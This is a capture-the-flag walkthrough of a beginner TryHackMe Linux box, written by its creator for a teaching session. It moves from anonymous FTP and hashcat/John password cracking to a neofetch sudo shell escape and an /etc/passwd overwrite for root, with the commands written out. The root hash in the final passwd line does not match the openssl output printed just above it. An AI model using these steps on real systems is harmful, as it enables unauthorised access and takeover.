---
title: "Impetum(THM)"
permalink: /writeups/impetum
---

# <a href="https://www.tryhackme.com/jr/impetum" target="_blank">Impetum - THM</a>

## Tags
ctf, custom box, ftp, beginner

## Metadata

| Written | 10/11/2024
| Author | Thetvdh
| Platform | TryHackMe
| Box Type | Linux

## Tools used

- nmap
- ffuf
- ftp
- hashcat
- ssh2john
- john the ripper
- ssh
- name-that-hash
- base64
- neofetch
- openssl


# Foreword

This machine was created for a DMUHackers session to teach the basics of enumeration and attacking linux systems. The box was created by myself and this writeup will be very railroaded rather than the usual style of showing everything I tested during the process. I hope you enjoy!

### Note : For the purposes of this box the target IP was 10.10.206.209

# Impetum

## Enumeration

```sh
nmap -sV -sC -oN nmap/aggressive_scan.nmap 10.10.206.209
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-10 01:08 GMT
Nmap scan report for 10.10.206.209
Host is up (0.059s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.74.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             259 Nov 05 14:06 email.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 73:69:57:97:7b:14:3d:5c:57:8b:dc:73:b0:03:f3:e2 (RSA)
|   256 56:f1:85:13:c6:63:a0:85:b3:e2:e4:14:be:1b:b8:85 (ECDSA)
|_  256 34:a5:19:8e:9d:b3:6e:21:b8:98:1f:f4:a0:62:70:45 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.05 seconds
```

nmap scan reveals that FTP has anonymous login enabled and has a file called "email.txt" on it. nmap also shows that ports 22 and 80 are open.

It also answers questions 1-6

### FTP server

```
Connected to 10.10.206.209.
220 (vsFTPd 3.0.5)
Name (10.10.206.209:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

```sh
get email.txt
exit
cat email.txt
```

The contents of email.txt gives us the answer to question 7.

### Password Hash

Using name-that-hash will reveal the hash type, the answer to question 8.

```
nth -f hash.txt                                                        

  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

2361c3d9a2d896996590f7751cd43e1f

Most Likely 
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach

Least Likely
Domain Cached Credentials 2, HC: 2100 JtR: mscach2 Double MD5, HC: 2600  Tiger-128,  Skein-256(128),  
Skein-512(128),  Lotus Notes/Domino 5, HC: 8600 JtR: lotus5 md5(md5(md5($pass))), HC: 3500 Summary: 
Hashcat mode is only supported in hashcat-legacy. md5(uppercase(md5($pass))), HC: 4300  md5(sha1($pass)),
HC: 4400  md5(utf16($pass)), JtR: dynamic_29 md4(utf16($pass)), JtR: dynamic_33 md5(md4($pass)), JtR: 
dynamic_34 Haval-128, JtR: haval-128-4 RIPEMD-128, JtR: ripemd-128 MD2, JtR: md2 Snefru-128, JtR: 
snefru-128 DNSSEC(NSEC3), HC: 8300  RAdmin v2.x, HC: 9900 JtR: radmin Cisco Type 7,  BigCrypt, JtR: 
bigcrypt 
```

To crack the password we will be using hashcat with the rockyou.txt wordlist and the best64 ruleset.

```sh
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

2361c3d9a2d896996590f7751cd43e1f:<REDACTED>             
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 2361c3d9a2d896996590f7751cd43e1f
Time.Started.....: Sun Nov 10 01:17:48 2024 (9 secs)
Time.Estimated...: Sun Nov 10 01:17:57 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7106.7 kH/s (9.16ms) @ Accel:256 Loops:77 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 50383872/1104517645 (4.56%)
Rejected.........: 0/50383872 (0.00%)
Restore.Point....: 653312/14344385 (4.55%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: harvey22 -> hunhun
Hardware.Mon.#1..: Util: 92%
```

This gives us the answer to question 9. 


### Website

Accessing the website reveals the ubuntu default page which gives the answer to question 10

Next, running ffuf reveals 1 page (index.html)

```sh
ffuf -u http://10.10.206.209/FUZZ -w /usr/share/wordlists/dirb/common.txt
 :: Method           : GET
 :: URL              : http://10.10.206.209/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 104ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 106ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 105ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 93ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 60ms]
logs                    [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 59ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 59ms]
:: Progress: [4614/4614] :: Job [1/1] :: 653 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

Likely there are more pages and therefore we will run again specifying it to look for .html pages.

```sh
ffuf -u http://10.10.206.209/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .html

 :: Method           : GET
 :: URL              : http://10.10.206.209/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 60ms]
.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 60ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.hta.html               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 67ms]
.htaccess.html          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 69ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 69ms]
.htpasswd.html          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 71ms]
admin.html              [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 118ms]
details.html            [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 61ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 63ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 67ms]
logs                    [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 66ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 58ms]
:: Progress: [9228/9228] :: Job [1/1] :: 232 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

The second ffuf scan gives us the answer to question 11.

### Admin page

Attempting to access admin.html pops up a basic HTTP login prompt. We have creds from the email.txt file. Using these creds gives us access to admin.html

/manage-users and /site-settings both lead to nothing useful. Accessing /logs shows a list. Viewing the page source reveals that only one user has logs associated with it. Clicking the view details button takes us to /details.html which gives us the answer to question 12 and an encrypted SSH key.

Copying the SSH key into a file called id_rsa and then running ssh2john (the answer to question 12) on it will give us a hash.

```sh
ssh2john id_rsa > ssh_key_hash.hash
```

Then we can run John The Ripper against it.

```sh
john ssh_key_hash.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED>         (id_rsa)     
1g 0:00:00:02 DONE (2024-11-10 01:37) 0.4065g/s 13.00p/s 13.00c/s 13.00C/s 123456..butterfly
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                     
```

This gives us the answer to question 13.

## Logging into the machine.

Now we have the password to the SSH key we can use it to login to the target.

This can be accomplished by:

```sh
chmod 600 id_rsa # Make the key usable by ssh
ssh boss@10.10.206.209
ssh -i id_rsa boss@10.10.206.209
The authenticity of host '10.10.206.209 (10.10.206.209)' can't be established.
ED25519 key fingerprint is SHA256:cWJdE3KjoXFTvW2hMeuONNa06orlbiDCov5zL5aBgLM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.206.209' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-124-generic x86_64)
```

Running ls reveals the answer to question 14.

### Finding the bosses password
Look for files that contain the word "password" or contain the word "password" in their name. This isn't fool proof but could be useful:

```sh
find . -name *password*
./Important Files/password.bak
./Documents/bosspassword.txt
```
This reveals 2 passwords.

### password.bak

.bak files are usually for backups so potentially it could be a password backup. However, running the base64 decode command on the bak gives us a message "this is a red herring".

```sh
echo -n dGhpcyBpcyBhIHJlZCBoZXJyaW5n | base64 -d
```

### bosspassword.txt

This is more useful. It reveals
```
I'm very forgetful so here is my password:

SUFNVEhFQklHQk9TUw==

I'm not stupid though, It's highly encrypted using a very strong encryption algorithm!! No one can ever break Base64!!!
```

It tells us it is in Base64, running the following command gives us his password and the answer to question 15:

```sh
echo -n SUFNVEhFQklHQk9TUw== | base64 -d
```

### Privesc enumeration

Basic sudo -l will reveal the answer to question 16.

```sh
sudo -l
[sudo] password for boss: 
Matching Defaults entries for boss on target:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boss may run the following commands on target:
    (admin) /usr/bin/neofetch
```

 Using GTFObins [GTFOBins](https://gtfobins.github.io/) will reveal that we can use neofetch to execute commands, in this case as the admin user:

 ```sh
 TF=$(mktemp)
 echo 'exec /bin/sh' > $TF
 sudo -u admin /usr/bin/neofetch --config $TF
```

Running the above will give us this error:
```
/usr/bin/neofetch: line 4459: /tmp/tmp.3zspa9Sl2D: Permission denied
```
To fix this, take the file name and give it 777 permissions, then rerun the final command.

```sh
chmod 777 /tmp/tmp.3zspa9Sl2D
sudo -u admin /usr/bin/neofetch --config $TF
```

This will give us a basic sh shell. To get a better one, just run the command "bash"

### user.txt

Changing directoy to admin's home directory will give us user.txt

### root.txt

Running [linpeas](https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/linpeas.sh) will reveal that the admin account is in the root user group. It also means that the misconfigured /etc/passwd file with root write permissions on the group can be edited. If you change the password in the passwd file it overrides the shadow file. A passwd compatible file can be generated with the following command.

```sh
openssl passwd password
v/FfoSzTu1u3A
```

Putting this password where the x is in passwd will mean you can login as the root account with the password "password".

```
# Line in the passwd file
root:6ef0MSVG45YyQ:0:0:root:/root:/bin/bash
```

Change to /root and then you have root.txt